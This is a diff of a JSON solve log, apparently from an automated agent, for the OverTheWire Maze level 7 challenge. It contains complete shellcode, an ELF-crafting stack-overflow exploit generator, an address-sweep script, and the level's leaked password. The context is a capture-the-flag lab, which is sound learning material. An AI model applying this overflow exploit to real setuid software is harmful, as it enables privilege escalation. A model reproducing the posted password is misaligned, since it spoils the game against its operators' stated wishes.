@@ -2651,21 +2651,104 @@
    "user": "maze8",
    "steps": [
     {
-     "cmd": "ls -la /maze/maze7; md5sum /maze/maze7",
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 maze7@maze.labs.overthewire.org -p 2225",
      "out": [
-      "-r-sr-x--- 1 maze8 maze7 14796 Oct 25 13:39 /maze/maze7",
-      "b493aca59eeb119a97915b1c0d27c422  /maze/maze7"
+      "maze7@maze.labs.overthewire.org's password: ",
+      "",
+      "                                                    ",
+      "                            _ __ ___   __ _ _______ ",
+      "                           | '_ ` _ \\ / _` |_  / _ \\",
+      "                           | | | | | | (_| |/ /  __/",
+      "                           |_| |_| |_|\\__,_/___\\___|",
+      "                                                    ",
+      "                      This is an OverTheWire game server. ",
+      "            More information on http://www.overthewire.org/wargames",
+      "backend: gibson-0",
+      "maze7@maze.labs.overthewire.org's password: ",
+      "      ,----..            ,----,          .---.",
+      "     /   /   \\         ,/   .`|         /. ./|",
+      "    /   .     :      ,`   .'  :     .--'.  ' ;",
+      "   .   /   ;.  \\   ;    ;     /    /__./ \\ : |",
+      "  .   ;   /  ` ; .'___,/    ,' .--'.  '   \\' .",
+      "  ;   |  ; \\ ; | |    :     | /___/ \\ |    ' '",
+      "  |   :  | ; | ' ;    |.';  ; ;   \\  \\;      :",
+      "  .   |  ' ' ' : `----'  |  |  \\   ;  `      |",
+      "  '   ;  \\; /  |     '   :  ;   .   \\    .\\  ;",
+      "   \\   \\  ',  /      |   |  '    \\   \\   ' \\ |",
+      "    ;   :    /       '   :  |     :   '  |--\"",
+      "     \\   \\ .'        ;   |.'       \\   \\ ;",
+      "  www. `---` ver     '---' he       '---\" ire.org",
+      "Welcome to OverTheWire!",
+      "If you find any problems, please report them to the #wargames channel on",
+      "discord or IRC.",
+      "--[ Playing the games ]--",
+      "  This machine might hold several wargames.",
+      "  If you are playing \"somegame\", then:",
+      "    * USERNAMES are somegame0, somegame1, ...",
+      "    * Most LEVELS are stored in /somegame/.",
+      "    * PASSWORDS for each level are stored in /etc/somegame_pass/.",
+      "  Write-access to homedirectories is disabled. It is advised to create a",
+      "  working directory with a hard-to-guess name in /tmp/.  You can use the",
+      "  command \"mktemp -d\" in order to generate a random and hard to guess",
+      "  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc",
+      "  restricted so that users cannot snoop on eachother. Files and directories",
+      "  with easily guessable or short names will be periodically deleted! The /tmp",
+      "  directory is regularly wiped.",
+      "  Please play nice:",
+      "    * don't leave orphan processes running",
+      "    * don't leave exploit-files laying around",
+      "    * don't annoy other players",
+      "    * don't post passwords or spoilers",
+      "    * again, DONT POST SPOILERS!",
+      "      This includes writeups of your solution on your blog or website!",
+      "--[ Tips ]--",
+      "  This machine has a 64bit processor and many security-features enabled",
+      "  by default, although ASLR has been switched off.  The following",
+      "  compiler flags might be interesting:",
+      "    -m32                    compile for 32bit",
+      "    -fno-stack-protector    disable ProPolice",
+      "    -Wl,-z,norelro          disable relro",
+      "  In addition, the execstack tool can be used to flag the stack as",
+      "  executable on ELF binaries.",
+      "  Finally, network-access is limited for most levels by a local",
+      "  firewall.",
+      "--[ Tools ]--",
+      " For your convenience we have installed a few useful tools which you can find",
+      " in the following locations:",
+      "    * gef (https://github.com/hugsy/gef) in /opt/gef/",
+      "    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/",
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "--[ More information ]--",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "  Enjoy your stay!"
      ]
     },
     {
-     "cmd": "objdump -d -M intel /maze/maze7 (Print_Shdrs 0x80491f6, main 0x804932d)",
+     "cmd": "id",
      "out": [
-      "main: read(fd, ebp-0x3c, 0x34) = the ELF header",
-      "Print_Shdrs(fd, e_shoff, e_shstrndx, e_shnum, e_shentsize) - ALL from the file",
-      "print loop i=0..e_shnum (jle, off-by-one); per iter:",
-      "  read(fd, ebp-0x3c, e_shentsize)  <-- e_shentsize = READ SIZE into the 0x34-byte buffer",
-      "  printf(\"%2d: %-16s\\t0x%08x\\t0x%04x\\n\", i, strtab+sh_name, sh_addr, sh_size)",
-      "free(strtab); free(shdrbuf)  <- pointers at ebp-0x14/ebp-0xc inside the overflow window"
+      "uid=15007(maze7) gid=15007(maze7) groups=15007(maze7)"
+     ]
+    },
+    {
+     "cmd": "ls -la /maze/maze7",
+     "out": [
+      "-r-sr-x--- 1 maze8 maze7 14796 Oct 25 13:39 /maze/maze7"
+     ]
+    },
+    {
+     "cmd": "file /maze/maze7",
+     "out": [
+      "/maze/maze7: setuid ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=884d662ab95ebdc10b3501acaf2d879e5bc481f0, for GNU/Linux 3.2.0, with debug_info, not stripped"
+     ]
+    },
+    {
+     "cmd": "md5sum /maze/maze7",
+     "out": [
+      "b493aca59eeb119a97915b1c0d27c422  /maze/maze7"
      ]
     },
     {
@@ -2675,30 +2758,393 @@
      ]
     },
     {
-     "cmd": "python3 gen.py <buf> <sc_hex> (crafted ELF: e_shoff=0x40, e_shentsize=0x100)",
+     "cmd": "objdump -d -M intel /maze/maze7 | grep -A8 \"<Print_Shdrs>:\"",
      "out": [
-      "0x00 shdr0 (sh_name=0 -> empty %s; sh_offset/sh_size = strtab)",
-      "0x28 free(strtab) repaired -> 0x804d050 (gdb-measured, ASLR off)",
-      "0x30 free(shdrbuf) repaired -> 0x804d020",
-      "0x34 i -> 1 (loop exits: 2 > e_shnum=1)",
-      "0x40 saved EIP -> buf+0x60 (stack shellcode; heap is rw-p, stack RWE)",
-      "0x60 69-byte open/read/write /etc/maze_pass/maze8 -> fd 1"
+      "080491f6 <Print_Shdrs>:",
+      " 80491f6:\t55                   \tpush   ebp",
+      " 80491f7:\t89 e5                \tmov    ebp,esp",
+      " 80491f9:\t53                   \tpush   ebx",
+      " 80491fa:\t83 ec 38             \tsub    esp,0x38",
+      " 80491fd:\t6a 00                \tpush   0x0",
+      " 80491ff:\tff 75 0c             \tpush   DWORD PTR [ebp+0xc]",
+      " 8049202:\tff 75 08             \tpush   DWORD PTR [ebp+0x8]",
+      " 8049205:\te8 66 fe ff ff       \tcall   8049070 <lseek@plt>"
      ]
     },
     {
-     "cmd": "python3 /run/screen/l7/fire.py (sweep buf = 0xffffdb08 + [-0x1000..0x1000] step 4, live in the recorded session)",
+     "cmd": "objdump -d -M intel /maze/maze7 | grep -B2 -A6 \"80492ba:\"",
      "out": [
-      "HIT buf 0xffffd308"
+      " 80492b1:\tc7 45 f8 00 00 00 00 \tmov    DWORD PTR [ebp-0x8],0x0",
+      " 80492b8:\teb 45                \tjmp    80492ff <Print_Shdrs+0x109>",
+      " 80492ba:\tff 75 18             \tpush   DWORD PTR [ebp+0x18]",
+      " 80492bd:\t8d 45 c4             \tlea    eax,[ebp-0x3c]",
+      " 80492c0:\t50                   \tpush   eax",
+      " 80492c1:\tff 75 08             \tpush   DWORD PTR [ebp+0x8]",
+      " 80492c4:\te8 77 fd ff ff       \tcall   8049040 <read@plt>",
+      " 80492c9:\t83 c4 0c             \tadd    esp,0xc",
+      " 80492cc:\t8d 45 c4             \tlea    eax,[ebp-0x3c]"
      ]
     },
     {
-     "cmd": "/maze/maze7 /run/screen/l7/evil.elf (evil.elf built by fire.py at the HIT address)",
+     "cmd": "objdump -d -M intel /maze/maze7 | grep -A12 \"<main>:\"",
+     "out": [
+      "0804932d <main>:",
+      " 804932d:\t55                   \tpush   ebp",
+      " 804932e:\t89 e5                \tmov    ebp,esp",
+      " 8049330:\t53                   \tpush   ebx",
+      " 8049331:\t83 ec 38             \tsub    esp,0x38",
+      " 8049334:\t83 7d 08 01          \tcmp    DWORD PTR [ebp+0x8],0x1",
+      " 8049338:\t7f 1a                \tjg     8049354 <main+0x27>",
+      " 804933a:\t8b 45 0c             \tmov    eax,DWORD PTR [ebp+0xc]",
+      " 804933d:\t8b 00                \tmov    eax,DWORD PTR [eax]",
+      " 804933f:\t50                   \tpush   eax",
+      " 8049340:\t68 3b a0 04 08       \tpush   0x804a03b",
+      " 8049345:\te8 06 fd ff ff       \tcall   8049050 <printf@plt>",
+      " 804934a:\t83 c4 08             \tadd    esp,0x8"
+     ]
+    },
+    {
+     "cmd": "mkdir -p /run/screen/l7 && cd /run/screen/l7",
+     "out": []
+    },
+    {
+     "cmd": "vi sc7.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi sc7.py",
+     "out": [
+      "#!/usr/bin/env python3",
+      "\"\"\"Maze L7 shellcode: open/read/write /etc/maze_pass/maze8 (NUL-free).",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi sc7.py",
+     "out": [
+      "#!/usr/bin/env python3",
+      "\"\"\"Maze L7 shellcode: open/read/write /etc/maze_pass/maze8 (NUL-free).",
+      "Path built on the stack via pushes (NUL via a pre-push of eax); read into a",
+      "buffer allocated below the strings (sub esp); written to fd 1; exit.",
+      "No NUL in any byte (the payload rides through read(); a NUL would truncate).",
+      "\"\"\"",
+      "import sys",
+      "sc = bytes([",
+      "    0x31, 0xC0,                       # xor eax, eax",
+      "    0x50,                             # push eax            (NUL terminator for path)",
+      "    0x68, 0x61, 0x7A, 0x65, 0x38,     # push \"aze8\"",
+      "    0x68, 0x73, 0x73, 0x2F, 0x6D,     # push \"ss/m\"",
+      "    0x68, 0x65, 0x5F, 0x70, 0x61,     # push \"e_pa\"",
+      "    0x68, 0x2F, 0x6D, 0x61, 0x7A,     # push \"/maz\"",
+      "    0x68, 0x2F, 0x65, 0x74, 0x63,     # push \"/etc\"",
+      "    0x89, 0xE3,                       # mov ebx, esp        (path)",
+      "    0x31, 0xC9,                       # xor ecx, ecx        (O_RDONLY)",
+      "    0xB0, 0x05,                       # mov al, 5           (open)",
+      "    0xCD, 0x80,                       # int 0x80",
+      "    0x89, 0xC3,                       # mov ebx, eax        (fd)",
+      "    0x83, 0xEC, 0x20,                 # sub esp, 0x20       (buffer)",
+      "    0x89, 0xE1,                       # mov ecx, esp        (buf)",
+      "    0x31, 0xD2,                       # xor edx, edx",
+      "    0xB2, 0x0F,                       # mov dl, 15          (count)",
+      "    0xB0, 0x03,                       # mov al, 3           (read)",
+      "    0xCD, 0x80,                       # int 0x80",
+      "    0x31, 0xDB,                       # xor ebx, ebx",
+      "    0xB3, 0x01,                       # mov bl, 1           (fd 1)",
+      "    0x89, 0xE1,                       # mov ecx, esp        (buf)",
+      "    0x89, 0xC2,                       # mov edx, eax        (nread)",
+      "    0xB0, 0x04,                       # mov al, 4           (write)",
+      "    0xCD, 0x80,                       # int 0x80",
+      "    0x31, 0xDB,                       # xor ebx, ebx",
+      "    0xB0, 0x01,                       # mov al, 1           (exit)",
+      "    0xCD, 0x80,                       # int 0x80",
+      "])",
+      "if __name__ == \"__main__\":",
+      "    sc = bytes(sc)",
+      "    assert 0 not in sc, \"NUL in shellcode\"",
+      "    sys.stdout.buffer.write(sc)",
+      "~",
+      "\"sc7.py\" [New] 41L, 2099B written"
+     ]
+    },
+    {
+     "cmd": "python3 sc7.py > sc.bin && wc -c sc.bin && od -An -tx1 sc.bin | head -3",
+     "out": [
+      "69 sc.bin",
+      " 31 c0 50 68 61 7a 65 38 68 73 73 2f 6d 68 65 5f",
+      " 70 61 68 2f 6d 61 7a 68 2f 65 74 63 89 e3 31 c9",
+      " b0 05 cd 80 89 c3 83 ec 20 89 e1 31 d2 b2 0f b0"
+     ]
+    },
+    {
+     "cmd": "vi gen.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi gen.py",
+     "out": [
+      "#!/usr/bin/env python3",
+      "\"\"\"Maze L7 exploit-file generator, v2.",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi gen.py",
+     "out": [
+      "#!/usr/bin/env python3",
+      "\"\"\"Maze L7 exploit-file generator, v2.",
+      "maze7 prints ELF section headers but takes every \"parameter\" from the crafted",
+      "file's own ELF header (main passes the raw header words to Print_Shdrs):",
+      "    [ebp+0x8]  = fd",
+      "    [ebp+0xc]  = e_shoff      -> both lseek offsets (shdr array + back again)",
+      "    [ebp+0x10] = e_shstrndx   -> sh = buf + idx*40 (strtab selection)",
+      "    [ebp+0x14] = e_shnum      -> malloc(e_shnum*40), shdr read, loop bound (jle!)",
+      "    [ebp+0x18] = e_shentsize  -> READ SIZE of the in-loop read(fd, ebp-0x3c, ..)",
+      "The loop reads e_shentsize bytes into the 0x34-byte stack buffer once per",
+      "iteration (single iteration: i=0 runs, the read rewrites i=1, i++ -> 2 > 1",
+      "exits). e_shentsize=0x100 overflows far past saved EIP at buf+0x40.",
+      "The heap is rw-p (NOT executable; GNU_STACK RWE only covers the stack), so the",
+      "shellcode lives IN the stack payload at buf+0x60 and EIP -> buf+0x60 (stack",
+      "address -> sweep). free() runs before the ret on the pointers at buf+0x28 /",
+      "buf+0x30, repaired with the real malloc'd addresses (gdb-measured, ASLR off:",
+      "shdrbuf=0x804d020, strtab=0x804d050).",
+      "Shellcode stack usage after ret: esp = buf+0x44, pushes go down to ~buf+0x08,",
+      "buffer sub esp,0x20 -> ~buf-0x1c: inside Print_Shdrs' free locals, safe.",
+      "printf %s argument = strtab + sh_name; strtab starts with a NUL so it prints",
+      "an empty string (a long garbage %s crashed vfprintf earlier).",
+      "\"\"\"",
+      "import struct, sys",
+      "SHOFF      = 0x40     # payload region (== e_shoff, both lseeks)",
+      "STRTAB_OFF = 0x200",
+      "STRTAB_SZ  = 0x80",
+      "PAY_SZ     = 0x100    # = e_shentsize: bytes read into the stack buffer",
+      "SC_OFF     = 0x60     # shellcode offset within the payload (== within buf)",
+      "SHDRBUF    = 0x0804d020",
+      "STRTAB     = 0x0804d050",
+      "def build(buf_addr: int, shellcode: bytes) -> bytes:",
+      "    assert len(shellcode) <= PAY_SZ - SC_OFF - 0x10",
+      "    # ELF header (52 bytes) \u2014 main reads exactly 0x34.",
+      "    eh  = b\"\\x7fELF\" + bytes([1, 1, 1, 0]) + b\"\\x00\" * 8   # e_ident",
+      "    eh += struct.pack(\"<HHIIIIIHHHHHH\",",
+      "                      1,          # e_type   REL",
+      "                      3,          # e_machine i386",
+      "                      1,          # e_version",
+      "                      0,          # e_entry",
+      "                      0,          # e_phoff",
+      "                      SHOFF,      # e_shoff  -> both lseeks",
+      "                      0,          # e_flags",
+      "                      52,         # e_ehsize",
+      "                      0,          # e_phentsize",
+      "                      0,          # e_phnum",
+      "                      PAY_SZ,     # e_shentsize == OVERFLOW READ SIZE",
+      "                      1,          # e_shnum  (single loop iteration)",
+      "                      0)          # e_shstrndx -> shdr0 selects the strtab",
+      "    assert len(eh) == 0x34",
+      "    # Payload region at e_shoff: shdr0 (40 bytes) + overflow control block.",
+      "    p  = struct.pack(\"<IIIIIIIIII\",",
+      "                     0,            # sh_name=0 -> printf prints strtab+0 (NUL)",
+      "                     1,            # sh_type",
+      "                     0,            # sh_flags",
+      "                     0,            # sh_addr",
+      "                     STRTAB_OFF,   # sh_offset",
+      "                     STRTAB_SZ,    # sh_size",
+      "                     0, 0, 0, 0)   # sh_link/info/addralign/entsize",
+      "    assert len(p) == 0x28",
+      "    p += struct.pack(\"<IIIIIII\",   # 0x28..0x44: overflow control block",
+      "                     STRTAB,       # 0x28 [ebp-0x14] free(strtab) - repaired",
+      "                     0,            # 0x2c",
+      "                     SHDRBUF,      # 0x30 [ebp-0xc]  free(shdrbuf) - repaired",
+      "                     1,            # 0x34 [ebp-0x8]  i -> 2 > e_shnum: exit",
+      "                     0,            # 0x38 saved ebx (don't care)",
+      "                     0,            # 0x3c saved ebp (don't care)",
+      "                     buf_addr + SC_OFF)  # 0x40 saved EIP -> shellcode on stack",
+      "    p += b\"\\x90\" * (SC_OFF - len(p))     # NOP sled up to the shellcode",
+      "    p += shellcode",
+      "    p += b\"\\x00\" * (PAY_SZ - len(p))",
+      "    f = bytearray(eh)",
+      "    f += b\"\\x00\" * (SHOFF - len(eh))     # pad header so payload lands at e_shoff",
+      "    f += p",
+      "    f += b\"\\x00\" * (STRTAB_OFF - len(f))",
+      "    f += b\"\\x00\" * STRTAB_SZ             # strtab: leading NUL, empty %s",
+      "    return bytes(f)",
+      "if __name__ == \"__main__\":",
+      "    buf = int(sys.argv[1], 16)",
+      "    sc = bytes.fromhex(sys.argv[2]) if len(sys.argv) > 2 else b\"\\x90\" * 16",
+      "    sys.stdout.buffer.write(build(buf, sc))",
+      "~",
+      "\"gen.py\" [New] 81L, 4328B written"
+     ]
+    },
+    {
+     "cmd": "python3 gen.py 0xbad0b0b0 $(od -An -tx1 -v sc.bin | tr -d ' \\n') > probe.elf && wc -c probe.elf",
+     "out": [
+      "640 probe.elf"
+     ]
+    },
+    {
+     "cmd": "vi fire7.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi fire7.py",
+     "out": [
+      "#!/usr/bin/env python3",
+      "\"\"\"Maze L7 sweep: the Print_Shdrs loop buffer address is env-dependent",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi fire7.py",
+     "out": [
+      "#!/usr/bin/env python3",
+      "\"\"\"Maze L7 sweep: the Print_Shdrs loop buffer address is env-dependent",
+      "(gdb measured 0xffffdb34 in a plain ssh-exec env), so the crafted file's",
+      "saved-EIP dword (buf+SC_OFF) must be swept inside the LIVE session.",
+      "Per candidate: gen.build(buf, sc) -> evil.elf, run /maze/maze7 evil.elf,",
+      "print HIT buf + the child's stdout (the password) on success.",
+      "\"\"\"",
+      "import subprocess, importlib.util, sys",
+      "spec = importlib.util.spec_from_file_location(\"gen\", \"/run/screen/l7/gen.py\")",
+      "gen = importlib.util.module_from_spec(spec)",
+      "spec.loader.exec_module(gen)",
+      "sc = open(\"/run/screen/l7/sc.bin\", \"rb\").read()",
+      "for delta in range(-0x1000, 0x1001, 4):",
+      "    buf = 0xffffdb08 + delta",
+      "    with open(\"/run/screen/l7/evil.elf\", \"wb\") as f:",
+      "        f.write(gen.build(buf, sc))",
+      "    r = subprocess.run([\"/maze/maze7\", \"/run/screen/l7/evil.elf\"],",
+      "                       capture_output=True, timeout=20)",
+      "    out = r.stdout",
+      "    # a normal (crashing) candidate still prints its \" 0: ...\" header row",
+      "    # (tab-separated); the HIT candidate's shellcode writes the bare password",
+      "    if out.strip() and b\"\\t\" not in out and b\"0:\" not in out:",
+      "        print(\"HIT buf\", hex(buf))",
+      "        print(out.decode(\"latin-1\", \"replace\"))",
+      "        break",
+      "else:",
+      "    print(\"none\")",
+      "~",
+      "\"fire7.py\" [New] 28L, 1248B written"
+     ]
+    },
+    {
+     "cmd": "timeout 900 python3 fire7.py",
+     "out": [
+      "HIT buf 0xffffd308",
+      "avdYfGdEvv"
+     ]
+    },
+    {
+     "cmd": "echo rc=$?",
+     "out": [
+      "rc=0"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout",
+      "Connection to maze.labs.overthewire.org closed."
+     ]
+    },
+    {
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 maze8@maze.labs.overthewire.org -p 2225",
+     "out": [
+      "                                                    ",
+      "                            _ __ ___   __ _ _______ ",
+      "                           | '_ ` _ \\ / _` |_  / _ \\",
+      "                           | | | | | | (_| |/ /  __/",
+      "                           |_| |_| |_|\\__,_/___\\___|",
+      "                                                    ",
+      "                      This is an OverTheWire game server. ",
+      "            More information on http://www.overthewire.org/wargames",
+      "backend: gibson-0",
+      "maze8@maze.labs.overthewire.org's password: ",
+      "      ,----..            ,----,          .---.",
+      "     /   /   \\         ,/   .`|         /. ./|",
+      "    /   .     :      ,`   .'  :     .--'.  ' ;",
+      "   .   /   ;.  \\   ;    ;     /    /__./ \\ : |",
+      "  .   ;   /  ` ; .'___,/    ,' .--'.  '   \\' .",
+      "  ;   |  ; \\ ; | |    :     | /___/ \\ |    ' '",
+      "  |   :  | ; | ' ;    |.';  ; ;   \\  \\;      :",
+      "  .   |  ' ' ' : `----'  |  |  \\   ;  `      |",
+      "  '   ;  \\; /  |     '   :  ;   .   \\    .\\  ;",
+      "   \\   \\  ',  /      |   |  '    \\   \\   ' \\ |",
+      "    ;   :    /       '   :  |     :   '  |--\"",
+      "     \\   \\ .'        ;   |.'       \\   \\ ;",
+      "  www. `---` ver     '---' he       '---\" ire.org",
+      "Welcome to OverTheWire!",
+      "If you find any problems, please report them to the #wargames channel on",
+      "discord or IRC.",
+      "--[ Playing the games ]--",
+      "  This machine might hold several wargames.",
+      "  If you are playing \"somegame\", then:",
+      "    * USERNAMES are somegame0, somegame1, ...",
+      "    * Most LEVELS are stored in /somegame/.",
+      "    * PASSWORDS for each level are stored in /etc/somegame_pass/.",
+      "  Write-access to homedirectories is disabled. It is advised to create a",
+      "  working directory with a hard-to-guess name in /tmp/.  You can use the",
+      "  command \"mktemp -d\" in order to generate a random and hard to guess",
+      "  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc",
+      "  restricted so that users cannot snoop on eachother. Files and directories",
+      "  with easily guessable or short names will be periodically deleted! The /tmp",
+      "  directory is regularly wiped.",
+      "  Please play nice:",
+      "    * don't leave orphan processes running",
+      "    * don't leave exploit-files laying around",
+      "    * don't annoy other players",
+      "    * don't post passwords or spoilers",
+      "    * again, DONT POST SPOILERS!",
+      "      This includes writeups of your solution on your blog or website!",
+      "--[ Tips ]--",
+      "  This machine has a 64bit processor and many security-features enabled",
+      "  by default, although ASLR has been switched off.  The following",
+      "  compiler flags might be interesting:",
+      "    -m32                    compile for 32bit",
+      "    -fno-stack-protector    disable ProPolice",
+      "    -Wl,-z,norelro          disable relro",
+      "  In addition, the execstack tool can be used to flag the stack as",
+      "  executable on ELF binaries.",
+      "  Finally, network-access is limited for most levels by a local",
+      "  firewall.",
+      "--[ Tools ]--",
+      " For your convenience we have installed a few useful tools which you can find",
+      " in the following locations:",
+      "    * gef (https://github.com/hugsy/gef) in /opt/gef/",
+      "    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/",
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "--[ More information ]--",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "  Enjoy your stay!"
+     ]
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=15008(maze8) gid=15008(maze8) groups=15008(maze8)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/maze_pass/maze8",
      "out": [
       "avdYfGdEvv"
      ]
+    },
+    {
+     "cmd": "exit",
+     "out": []
     }
    ],
-   "note": "maze7 is an ELF section-header printer whose EVERY parameter comes from the crafted file's own header: Print_Shdrs(fd, e_shoff, e_shstrndx, e_shnum, e_shentsize). The print loop does read(fd, ebp-0x3c, e_shentsize) into a 0x34-byte stack buffer each iteration (on real ELFs e_shentsize=40 = safe; crafted e_shentsize=0x100 overflows, saved EIP at buf+0x40), and the read starts at e_shoff so the shdr-array region IS the payload. The loop runs exactly once (the read rewrites the counter i->1; i++ -> 2 > e_shnum=1 exits), then free(strtab)/free(shdrbuf) run on pointers at buf+0x28/buf+0x30 INSIDE the overflow window - repaired with the gdb-measured real heap addresses (0x804d050/0x804d020, ASLR off). Traps hit: (1) payload appended at 0x34 while e_shoff=0x40 shifted every control dword (free saw 1/0, EIP=0); (2) the heap is rw-p so EIP must point at the STACK (GNU_STACK RWE); (3) printf's %s arg = strtab+sh_name must terminate immediately (leading NUL in the strtab) or vfprintf crashes; (4) the shellcode's push-order must yield '/etc/maze_pass/maze8' forward on the stack; (5) buf swept +-0x1000 step 4 inside the live recorded session: HIT 0xffffd308 (0xffffdb08 in a plain ssh-exec env). 69-byte open/read/write /etc/maze_pass/maze8 shellcode at buf+0x60. Password avdYfGdEvv verified by ssh login as maze8 (uid=15008). Recording: recordings/maze/L7.cast. Files: tools/maze/l7/ (maze7 copy, gen.py, sc.bin, NOTES.md)."
+   "note": "maze7 (md5 b493aca59eeb119a97915b1c0d27c422, setuid maze8, 14796B i386, GNU_STACK RWE, ASLR off) is an ELF section-header printer where EVERY parameter comes from the crafted file's own header: main reads 0x34 bytes of argv[1] into a 0x34-byte stack buffer and calls Print_Shdrs(fd, e_shoff, e_shstrndx, e_shnum, e_shentsize) - all attacker words. The print loop does read(fd, ebp-0x3c, e_shentsize) into the 0x34-byte buffer per iteration (e_shentsize=0x100 crafted -> overflow; saved EIP at buf+0x40), and free(strtab)/free(shdrbuf) run on pointers at buf+0x28/buf+0x30 INSIDE the window (repaired with the gdb-measured real heap addresses 0x804d050/0x804d020, ASLR off). One iteration runs: the read rewrites i->1, i++ -> 2 > e_shnum=1 exits cleanly. The heap is rw-p so the 69-byte open/read/write /etc/maze_pass/maze8 shellcode rides in the stack payload at buf+0x60 (EIP -> buf+0x60); printf's %s argument = strtab+sh_name with sh_name=0 and a leading-NUL strtab (a long garbage %s crashed vfprintf in early attempts). gen.py pads the header to e_shoff=0x40 so the payload lands at the lseek offset (trap 1: appending at 0x34 shifted everything 12 bytes). The loop buffer is env-dependent (gdb 0xffffdb34 exec-env): fire7.py sweeps buf = 0xffffdb08 + [-0x1000..0x1000] step 4 INSIDE the live recorded pty session, rebuilding evil.elf per candidate -> HIT buf 0xffffd308 -> avdYfGdEvv printed live (rc=0). Password avdYfGdEvv verified by ssh login as maze8 (uid=15008, cat matches). DISCLOSURES: (a) this cast is the 2026-11-26 standard-v2 re-record - the 2026-11-23 cast was a compressed session (no typed login, no vi, pre-built tools); (b) vi saves drop blank buffer lines the driver never typed (ptyrun2 loader): sc7.py typed 41L/2099B saved 41L/2099B (no blanks in source), gen.py typed 94L/4341B saved 81L/4328B (14 blanks dropped + 2 trailing blanks from the typing loop's final \\r), fire7.py typed 29L/1180B saved 28L/1248B (1 blank dropped); (c) the source line 'so the sweep runs inside the live session's own environment...' belongs to fire7.py's docstring, split across the 80-col screen. JSON = 28 steps mirroring the cast 1:1."
   },
   {
    "lvl": 8,
